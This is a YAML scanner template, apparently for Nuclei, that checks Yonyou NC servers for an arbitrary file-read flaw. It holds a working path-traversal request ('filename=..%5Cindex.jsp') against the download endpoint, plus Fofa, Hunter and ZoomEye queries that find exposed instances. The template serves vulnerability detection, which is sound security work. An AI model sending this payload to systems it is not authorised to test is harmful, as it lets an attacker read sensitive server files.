# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - response.addHeader
          - request.getSession
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp'
id: yonyou-nc-download-fileread
info:
  author: Y3y1ng
  description: |-
    用友NC的download文件存在任意文件读取漏洞，攻击者可以利用该漏洞读取服务器上的敏感文件。
    Fofa: app="用友-UFIDA-NC"
    Hunter: web.title="YONYOU NC"
    ZoomEye: app:"Yonyou NC httpd"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 用友NC download文件存在任意文件读取漏洞
  severity: high
  tags: yonyou,fileread,argus-import
